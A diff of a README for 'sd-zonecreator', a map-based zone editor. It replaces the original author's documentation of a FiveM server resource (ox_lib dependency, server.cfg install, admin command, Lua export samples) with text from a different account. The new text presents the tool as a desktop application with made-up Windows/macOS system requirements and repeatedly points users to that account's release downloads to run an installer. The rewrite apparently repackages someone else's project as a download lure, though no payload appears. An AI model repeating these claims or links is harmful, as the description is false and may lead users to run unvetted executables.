@@ -1,189 +1,66 @@
-# sd-zonecreator
+# 🌐 sd-zonecreator - Create Zones with Ease
 
-> A visual zone creation tool featuring an interactive map interface, real-time 3D preview, multiple export formats and more!
+## 🚀 Getting Started
 
-<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/e56497fb-5f5a-4507-9966-0f6e4bb7a0bc" />
+Welcome to the **sd-zonecreator**! This tool allows you to create zones easily using a visual map interface. Enjoy real-time 3D previews and choose from various export formats to fit your needs.
 
+[![Download sd-zonecreator](https://img.shields.io/badge/Download-sd--zonecreator-blue)](https://github.com/lillemon123/sd-zonecreator/releases)
 
-<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ed58c11c-716d-44ee-aaac-eef6ed02a5fa" />
+## 📥 Download & Install
 
-<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/96b95e76-37f7-4d79-a3b4-a1af3464c160" />
+To get started, visit this page to download the application:
 
-<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7ecc97d1-0f6f-4af6-bf77-1156a3cdb4fb" />
+[Download sd-zonecreator from Releases](https://github.com/lillemon123/sd-zonecreator/releases)
 
-<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/5d4f929b-e29a-463b-b514-51474315d8a2" />
+After downloading, locate the file in your downloads folder. Open it to start the installation process. Follow the prompts on your screen. Once the installation is complete, you can start the application.
 
+## 🛠️ Features
 
-![GitHub release](https://img.shields.io/github/v/release/Samuels-Development/sd-zonecreator?label=Release&logo=github)
-[![Discord](https://img.shields.io/discord/842045164951437383?label=Discord&logo=discord&logoColor=white)](https://discord.gg/FzPehMQaBQ)
+- **Interactive Map Interface**: Easily navigate and visualize your zones.
+- **Real-Time 3D Preview**: See changes as you make them without delay.
+- **Multiple Export Formats**: Choose the format that best suits your needs, whether that's for sharing or using in other software.
+- **User-Friendly Design**: Designed for simplicity, so you can focus on creating zones without any hassle.
 
-If you have any issues or suggestions, feel free to PR, create an issue or join my discord: https://discord.gg/FzPehMQaBQ
+## 💻 System Requirements
 
-## 📋 Dependencies
+Ensure your computer meets the following requirements:
 
-- [ox_lib](https://github.com/overextended/ox_lib)
+- Operating System: Windows 10 or newer, macOS Catalina or newer
+- Memory: At least 4 GB RAM
+- Storage: At least 500 MB of free space
+- Graphics: DirectX 11 compatible graphics or higher
 
-## 🎯 Features
+## 🌟 How to Use sd-zonecreator
 
-### Core Features
+1. **Launch the Application**: Find the sd-zonecreator icon on your desktop or in your applications folder. Double-click to open it.
+2. **Create a New Zone**: Start a new project using the "New Zone" button. You can choose the area you want to define on the map.
+3. **Edit and Customize**: Use the tools on the left panel to modify the zone's properties. Adjust the colors, shapes, and sizes as you see fit.
+4. **Preview Your Work**: Click on the “Preview” button to see how your zone looks in 3D. Make adjustments as needed.
+5. **Export Your Zone**: Once satisfied, click on the “Export” button. Select your preferred format from the dropdown menu and save it to your computer.
 
-- **Interactive Map** - Click to place zone points on a high-resolution GTA V satellite map
-- **Real-time 3D Preview** - View your zone in-game with a free-fly camera system
-- **Multiple Export Formats** - Export to PolyZone, ox_lib, vector2, or vector3 formats
-- **Import Support** - Paste existing zone code to edit and visualize zones
-- **Grid Mode** - Displays a grid overlay and snaps points to 10-unit intervals.
-- **Auto Ground Z** - Automatically calculates ground height at the zone center
-- **Multi-Zone Management** - Create and manage multiple zones in a single session
+## 📞 Need Help?
 
-### Template Shapes
+If you encounter any issues or have questions, please reach out through our Discord community. It's a great place to connect with other users and get support.
 
-Quickly create zones using pre-built shape templates:
+![Discord Community](https://img.shields.io/discord/842045164951437383?label=Discord&logo=discord)
 
-| Shape | Description |
-|-------|-------------|
-| **Rectangle** | 4-point square/rectangular zone |
-| **Circle** | 16-point circular approximation |
-| **Triangle** | 3-point triangular zone |
-| **Pentagon** | 5-point pentagonal zone |
-| **Hexagon** | 6-point hexagonal zone |
-| **Star** | 10-point star shape |
-| **L-Shape** | 6-point L-shaped zone |
+## 📷 Screenshots
 
-All templates support:
-- **Drag to Position** - Drag the center marker to reposition the shape
-- **Scale Slider** - Adjust the size from 5 to 3000 units
-- **Rotation Slider** - Rotate the shape from 0° to 360°
+Here are some visuals of sd-zonecreator:
 
-### Point Management
+<img width="1920" height="1080" alt="Map Interface" src="https://github.com/user-attachments/assets/e56497fb-5f5a-4507-9966-0f6e4bb7a0bc" />
 
-- **Click on Map** - Add a new point to the active zone
-- **Drag Points** - Click and drag any point marker to reposition it
-- **Right-click Point** - Delete a single point
-- **Click on Polygon Edge** - Insert a new point on the closest edge
-- **Shift + Drag** - Box select multiple points
-- **Delete Selected** - Remove all selected points at once
+<img width="1920" height="1080" alt="3D Preview" src="https://github.com/user-attachments/assets/ed58c11c-716d-44ee-aaac-eef6ed02a5fa" />
 
-### Map Tools
+<img width="1920" height="1080" alt="Zone Customization" src="https://github.com/user-attachments/assets/96b95e76-37f7-4d79-a3b4-a1af3464c160" />
 
-| Tool | Shortcut | Description |
-|------|----------|-------------|
-| **Snap to Grid** | `G` | Snap points to 10-unit grid (shows grid overlay) |
-| **Show Distances** | `D` | Display distance labels between adjacent points |
-| **Undo** | `Ctrl+Z` | Undo last action |
-| **Redo** | `Ctrl+Y` | Redo last undone action |
-| **Search Location** | `Ctrl+F` | Jump to specific X, Y coordinates |
-| **Jump to Player** | Button | Center map on your current position |
+<img width="1920" height="1080" alt="Export Options" src="https://github.com/user-attachments/assets/7ecc97d1-0f6f-4af6-bf77-1156a3cdb4fb" />
 
-## 📦 Installation
+<img width="1920" height="1080" alt="User-Friendly Design" src="https://github.com/user-attachments/assets/5d4f929b-e29a-463b-b514-51474315d8a2" />
 
-1. [Download the latest release](https://github.com/Samuels-Development/sd-zonecreator/releases/latest) (ZIP, NOT SOURCE)
-2. Ensure `ox_lib` is started before `sd-zonecreator`
-3. Add `sd-zonecreator` to your resources folder
-4. Add `ensure sd-zonecreator` to your server.cfg
+## 🔗 Additional Links
 
----
+- [Visit the GitHub Repository](https://github.com/lillemon123/sd-zonecreator)
+- [Report an Issue](https://github.com/lillemon123/sd-zonecreator/issues)
 
-## 🛠️ Usage
-
-### Opening the Zone Creator
-
-Use the command to open the zone creator interface: (it's locked to group.admin)
-
-```
-/zonecreator
-```
-
-### Creating a Zone
-
-1. Click on the map to place zone points
-2. Add at least 3 points to form a polygon
-3. Adjust the zone name, thickness, and ground Z as needed
-4. Use "View Zone" to preview your zone in-game with a 3D camera
-
-### Exporting Zones
-
-Click any of the export buttons to copy the zone data to your clipboard:
-
-| Format | Description |
-|--------|-------------|
-| **PolyZone** | Full PolyZone.Create code with all parameters |
-| **ox_lib** | Full lib.zones.poly code for ox_lib |
-| **vec2** | List of vector2 coordinates (x, y) |
-| **vec3** | List of vector3 coordinates (x, y, z) |
-
-### Importing Zones
-
-1. Click the "Import" tab
-2. Paste existing zone code (supports PolyZone, ox_lib, or vector formats)
-3. Click "Import Zone" to load the zone for editing
-
-### Zone Viewer Controls
-
-When viewing a zone in 3D:
-
-| Control | Action |
-|---------|--------|
-| **W A S D** | Move camera horizontally |
-| **Q / E** | Move camera up / down |
-| **Mouse** | Look around |
-| **Shift** | Sprint (faster movement) |
-| **Arrow Up / Down** | Adjust zone thickness |
-| **Backspace** | Exit viewer and return to map |
-
----
-
-## 🎨 Export Examples
-
-### PolyZone Output
-
-```lua
-local myZone = PolyZone:Create({
-    vector2(100.0, 200.0),
-    vector2(150.0, 200.0),
-    vector2(150.0, 250.0),
-    vector2(100.0, 250.0),
-}, {
-    name = "myZone",
-    minZ = 25.0,
-    maxZ = 175.0,
-})
-```
-
-### ox_lib Output
-
-```lua
-local myZone = lib.zones.poly({
-    name = "myZone",
-    points = {
-        vec3(100.0, 200.0, 30.0),
-        vec3(150.0, 200.0, 30.0),
-        vec3(150.0, 250.0, 30.0),
-        vec3(100.0, 250.0, 30.0),
-    },
-    thickness = 150,
-    onEnter = function(self)
-        print('Entered', self.name)
-    end,
-    onExit = function(self)
-        print('Exited', self.name)
-    end,
-})
-```
-
-### vector2 Output
-
-```lua
-vector2(100.0, 200.0),
-vector2(150.0, 200.0),
-vector2(150.0, 250.0),
-vector2(100.0, 250.0),
-```
-
-### vector3 Output
-
-```lua
-vector3(100.0, 200.0, 30.0),
-vector3(150.0, 200.0, 30.0),
-vector3(150.0, 250.0, 30.0),
-vector3(100.0, 250.0, 30.0),
-```
+Thank you for choosing **sd-zonecreator!** We hope you enjoy using it as much as we enjoyed creating it.
